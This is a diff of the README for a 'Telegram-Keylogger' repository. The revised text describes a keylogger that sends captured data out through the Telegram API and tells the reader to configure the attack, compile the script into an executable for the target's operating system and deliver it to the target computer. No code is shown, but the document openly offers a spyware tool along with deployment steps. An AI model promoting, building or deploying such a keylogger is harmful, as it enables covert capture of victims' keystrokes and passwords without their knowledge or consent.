@@ -1,5 +1,7 @@
 # Telegram-Keylogger
-Keylogger and data harvester that relies on Telegram API or SMTP Server.
 
+Keylogger that relies on Telegram API.
 
-#WORK IN PROGRESS...
+Follow the instruction in the code to set up the attack. 
+
+Once the set up is done you have to compile this script to the executable of the desired os and then deliver it to the target computer.
